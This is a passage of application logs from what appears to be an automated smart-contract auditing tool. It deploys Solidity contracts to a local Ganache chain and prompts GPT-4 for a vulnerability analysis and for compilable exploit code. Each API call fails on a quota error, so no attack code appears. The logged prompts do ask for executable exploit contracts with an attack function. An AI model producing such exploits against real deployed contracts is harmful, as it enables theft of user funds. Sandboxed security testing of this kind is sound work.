return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'reasoning': '', 'summary': '', 'code': '', 'code_type': 'solidity', 'duration': 3.7736659049987793}
2025-07-09 10:04:13,942 - services.contract_service - INFO - Has exploit code: False
2025-07-09 10:04:13,942 - services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-09 10:04:13,942 - services.contract_service - INFO - Final vulnerability determination: False
2025-07-09 10:04:13,942 - services.contract_service - INFO - Attack strategy summary: 
2025-07-09 10:04:13,942 - services.contract_service - INFO - Analysis completed with status: OK
2025-07-09 10:04:13,942 - services.contract_service - INFO - Temporary file /tmp/tmpesvbax3_.sol removed
2025-07-09 10:04:13,960 - api.contract - INFO - Report saved with filename: Ownable_2025-07-09_10-04, status: OK
2025-07-09 10:04:13,961 - api.contract - INFO - Analysis completed successfully, returning report
2025-07-09 10:04:13,962 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:04:13,962 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:04:13,962 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:04:13,962 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:04:14,643 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:04:14,643 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:04:14,643 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:04:14,644 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 10:04:14,712 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:04:14,712 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 10:04:14,712 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:04:14,712 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:04:24,922 - api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-09 10:04:24,923 - api.contract - INFO - Analyzing code snippet
2025-07-09 10:04:24,928 - api.contract - INFO - Starting contract analysis for user: 3
2025-07-09 10:04:24,929 - services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpram52_yh.sol
2025-07-09 10:04:24,930 - services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-09 10:04:24,930 - services.contract_service - INFO - Compiling contract...
2025-07-09 10:04:24,932 - solcx - INFO - Using solc version 0.8.0
2025-07-09 10:04:25,086 - services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-09 10:04:25,088 - services.contract_service - INFO - Deploying 1 contracts...
2025-07-09 10:04:25,187 - services.contract_service - INFO - Contract SimpleWallet deployed at 0x21a59654176f2689d12E828B77a783072CD26680
2025-07-09 10:04:25,187 - services.contract_service - INFO - Setting up contract SimpleWallet...
2025-07-09 10:04:25,276 - services.contract_service - INFO - Contract SimpleWallet setup completed
2025-07-09 10:04:25,276 - services.contract_service - INFO - Funding contract SimpleWallet for attack testing...
2025-07-09 10:04:25,391 - services.contract_service - INFO - Contract SimpleWallet funded
2025-07-09 10:04:25,391 - services.contract_service - INFO - Building contract observation...
2025-07-09 10:04:25,479 - services.contract_service - INFO - Contract observation built successfully
2025-07-09 10:04:25,479 - services.contract_service - INFO - Generating attack strategy...
2025-07-09 10:04:25,480 - services.contract_service - INFO - Running Slither analysis...
2025-07-09 10:04:25,753 - services.contract_service - WARNING - Failed to run Slither analysis: Command '['solc-select', 'versions']' returned non-zero exit status 1.
2025-07-09 10:04:25,754 - services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/services/contract_service.py", line 208, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 47, in ensure_solc_version
    out = subprocess.check_output(["solc-select", "versions"], text=True)
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 466, in check_output
    return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 571, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['solc-select', 'versions']' returned non-zero exit status 1.

2025-07-09 10:04:25,754 - modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-09 10:04:25,754 - modules.attack_generator - INFO - Contract name: SimpleWallet
2025-07-09 10:04:25,754 - modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-09 10:04:25,754 - modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-09 10:04:25,755 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-09 10:04:25,755 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-09 10:04:25,755 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-09 10:04:25,962 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:25,962 - openai._base_client - INFO - Retrying request to /chat/completions in 0.424285 seconds
2025-07-09 10:04:26,580 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:26,581 - openai._base_client - INFO - Retrying request to /chat/completions in 0.783303 seconds
2025-07-09 10:04:27,556 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:27,557 - modules.attack_generator - ERROR - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
Traceback (most recent call last):
  File "/app/modules/attack_generator.py", line 254, in query_gpt4
    response = openai.chat.completions.create(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_utils/_utils.py", line 287, in wrapper
    return func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/resources/chat/completions/completions.py", line 1087, in create
    return self._post(
           ^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1249, in post
    return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1037, in request
    raise self._make_status_error_from_response(err.response) from None
openai.RateLimitError: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:27,558 - modules.attack_generator - INFO - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:27,558 - modules.attack_generator - INFO - Contract analysis completed in 1.80 seconds
2025-07-09 10:04:27,558 - modules.attack_generator - INFO - No vulnerabilities found in the contract
2025-07-09 10:04:27,558 - modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-09 10:04:27,558 - modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-09 10:04:27,558 - modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-09 10:04:27,558 - modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-09 10:04:27,714 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:27,715 - openai._base_client - INFO - Retrying request to /chat/completions in 0.426025 seconds
2025-07-09 10:04:28,283 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:28,283 - openai._base_client - INFO - Retrying request to /chat/completions in 0.990998 seconds
2025-07-09 10:04:29,416 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 429 Too Many Requests"
2025-07-09 10:04:29,417 - modules.attack_generator - ERROR - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
Traceback (most recent call last):
  File "/app/modules/attack_generator.py", line 254, in query_gpt4
    response = openai.chat.completions.create(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_utils/_utils.py", line 287, in wrapper
    return func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/resources/chat/completions/completions.py", line 1087, in create
    return self._post(
           ^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1249, in post
    return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/openai/_base_client.py", line 1037, in request
    raise self._make_status_error_from_response(err.response) from None
openai.RateLimitError: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:29,418 - modules.attack_generator - INFO - Error querying GPT-4: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
2025-07-09 10:04:29,418 - modules.attack_generator - INFO - Attack code generation completed in 1.86 seconds
2025-07-09 10:04:29,418 - modules.attack_generator - INFO - No attack code was generated
2025-07-09 10:04:29,418 - modules.attack_generator - INFO - Total attack strategy generation completed in 3.66 seconds
2025-07-09 10:04:29,418 - modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-09 10:04:29,419 - services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpram52_yh.sol",\n  "contracts": [\n    {\n      "contract_name": "SimpleWallet",\n      "address": "0x21a59654176f2689d12E828B77a783072CD26680",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "balance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "changeOwner",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getContractBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balance",\n          "signature": "balance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "changeOwner",\n          "signature": "changeOwner(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getContractBalance",\n          "signature": "getContractBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x21a59654176f2689d12E828B77a783072CD26680": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99729608840000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999154160000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balance": 3000000000000000000,\n        "getContractBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract SimpleWallet {\\n    address public owner;\\n    uint256 public balance;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    // D\\u00e9poser de l\'ETH dans le contrat\\n    function deposit() external payable {\\n        balance += msg.value;\\n    }\\n\\n    // Retirer tout l\'ETH du contrat\\n    function withdraw() external {\\n        require(msg.sender == owner, \\"Not authorized\\");\\n        uint256 amount = balance;\\n        balance = 0;\\n        payable(owner).transfer(amount);\\n    }\\n\\n    // Modifier le propri\\u00e9taire (potentiellement dangereux)\\n    function changeOwner(address newOwner) external {\\n        require(msg.sender == owner, \\"Not authorized\\");\\n        owner = newOwner;\\n    }\\n\\n    // Lire le solde du contrat\\n    function getContractBalance() external view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'contract_analysis': '', 'vulnerability_assessment': '', 'exploitation_requirements': '', 'analysis_duration': 1.803243637084961}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: \n\nVulnerability Assessment: \n\nExploitation Requirements: \n\n\nTarget Contract Address: 0x21a59654176f2689d12E828B77a783072CD26680\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'code': '', 'code_type': 'solidity', 'attack_duration': 1.8597955703735352}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpram52_yh.sol",\n  "contracts": [\n    {\n      "contract_name": "SimpleWallet",\n      "address": "0x21a59654176f2689d12E828B77a783072CD26680",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "balance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "changeOwner",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getContractBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balance",\n          "signature": "balance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "changeOwner",\n          "signature": "changeOwner(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getContractBalance",\n          "signature": "getContractBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x21a59654176f2689d12E828B77a783072CD26680": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99729608840000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999154160000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balance": 3000000000000000000,\n        "getContractBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract SimpleWallet {\\n    address public owner;\\n    uint256 public balance;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    // D\\u00e9poser de l\'ETH dans le contrat\\n    function deposit() external payable {\\n        balance += msg.value;\\n    }\\n\\n    // Retirer tout l\'ETH du contrat\\n    function withdraw() external {\\n        require(msg.sender == owner, \\"Not authorized\\");\\n        uint256 amount = balance;\\n        balance = 0;\\n        payable(owner).transfer(amount);\\n    }\\n\\n    // Modifier le propri\\u00e9taire (potentiellement 